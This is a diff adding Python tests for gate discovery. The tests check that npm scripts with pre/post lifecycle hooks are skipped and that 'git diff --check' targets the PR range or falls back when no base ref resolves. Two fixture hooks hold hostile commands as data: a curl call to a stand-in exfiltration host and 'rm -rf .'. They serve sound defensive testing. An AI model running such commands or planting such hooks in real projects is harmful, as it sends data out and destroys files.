@@ -257,6 +257,125 @@ class TestDiscoverGates:
         names = [g.name for g in gates]
         assert "npm:format:check" not in names
 
+    def test_discover_skips_npm_script_when_pre_lifecycle_hook_present(
+        self, tmp_path: Path
+    ) -> None:
+        """Iter-15 Finding 2: a benign script must NOT be invoked when
+        ``pre<name>``/``post<name>`` lifecycle hooks would also execute.
+        npm/yarn/pnpm/bun fire those hooks around ``<runner> run <name>``,
+        and discovery only validates the named script — so a malicious
+        ``preformat:check`` would smuggle ``curl`` past the allowlist.
+        """
+        from pdd.checkup_gates import discover_gates
+
+        _git_init(tmp_path)
+        (tmp_path / "package.json").write_text(
+            _make_pkg_json(
+                {
+                    "format:check": "prettier --check .",
+                    "preformat:check": "curl http://evil.example/exfil",
+                }
+            ),
+            encoding="utf-8",
+        )
+        gates = discover_gates(tmp_path, changed_files=())
+        names = [g.name for g in gates]
+        assert "npm:format:check" not in names
+
+    def test_discover_skips_npm_script_when_post_lifecycle_hook_present(
+        self, tmp_path: Path
+    ) -> None:
+        from pdd.checkup_gates import discover_gates
+
+        _git_init(tmp_path)
+        (tmp_path / "package.json").write_text(
+            _make_pkg_json(
+                {
+                    "typecheck": "tsc --noEmit",
+                    "posttypecheck": "rm -rf .",
+                }
+            ),
+            encoding="utf-8",
+        )
+        gates = discover_gates(tmp_path, changed_files=())
+        names = [g.name for g in gates]
+        assert "npm:typecheck" not in names
+
+    def test_git_diff_check_uses_pr_range_when_base_ref_resolvable(
+        self, tmp_path: Path
+    ) -> None:
+        """Iter-15 Finding 1: a committed whitespace failure on the PR
+        branch must be caught even when the worktree is clean. The gate
+        must run ``git diff --check <base>...HEAD``, not the plain
+        ``git diff --check`` against unstaged worktree changes.
+        """
+        from pdd.checkup_gates import discover_gates
+
+        subprocess.run(["git", "init", "-q", "-b", "main"], cwd=tmp_path, check=True)
+        subprocess.run(
+            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
+             "--allow-empty", "-m", "init", "-q"],
+            cwd=tmp_path,
+            check=True,
+        )
+        # Synthetic "PR" branch with a clean working tree.
+        subprocess.run(["git", "checkout", "-q", "-b", "feature"], cwd=tmp_path, check=True)
+        subprocess.run(
+            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
+             "--allow-empty", "-m", "feat", "-q"],
+            cwd=tmp_path,
+            check=True,
+        )
+        gates = discover_gates(tmp_path, changed_files=(), base_ref="main")
+        diff_gate = next(g for g in gates if g.name == "git-diff-check")
+        assert diff_gate.cmd == ["git", "diff", "--check", "main...HEAD"]
+
+    def test_git_diff_check_falls_back_when_base_ref_unresolvable(
+        self, tmp_path: Path
+    ) -> None:
+        """When no base ref verifies AND no ``main``/``master`` exists
+        in the worktree (synthetic test repo on a feature branch with
+        no remote), we keep the existing plain ``git diff --check`` so
+        single-commit smoke tests still see a gate."""
+        from pdd.checkup_gates import discover_gates
+
+        subprocess.run(
+            ["git", "init", "-q", "-b", "feature-only"], cwd=tmp_path, check=True
+        )
+        subprocess.run(
+            ["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit",
+             "--allow-empty", "-m", "init", "-q"],
+            cwd=tmp_path,
+            check=True,
+        )
+        gates = discover_gates(
+            tmp_path,
+            changed_files=(),
+            base_ref="branch-that-does-not-exist",
+        )
+        diff_gate = next(g for g in gates if g.name == "git-diff-check")
+        assert diff_gate.cmd == ["git", "diff", "--check"]
+
+    def test_git_diff_check_falls_back_to_main_master_when_no_base_ref(
+        self, tmp_path: Path
+    ) -> None:
+        """When no ``base_ref`` is supplied but a local ``main``/``master``
+        exists (the default for ``git init``), discovery still uses it
+        so the PR-range guarantee holds even when the caller forgot to
+        thread ``pr_metadata['base_ref']`` through. This preserves the
+        product invariant from issue #1092: a committed whitespace
+        failure must be caught."""
+        from pdd.checkup_gates import discover_gates
+
+        _git_init(tmp_path)
+        gates = discover_gates(tmp_path, changed_files=())
+        diff_gate = next(g for g in gates if g.name == "git-diff-check")
+        # Either ``master...HEAD`` or ``main...HEAD`` depending on the
+        # local ``init.defaultBranch`` — both satisfy the contract.
+        assert diff_gate.cmd[:3] == ["git", "diff", "--check"]
+        if len(diff_gate.cmd) > 3:
+            assert diff_gate.cmd[3].endswith("...HEAD")
+
 
 class TestRunGates:
     """``run_gates`` executes each discovered gate and persists artifacts."""
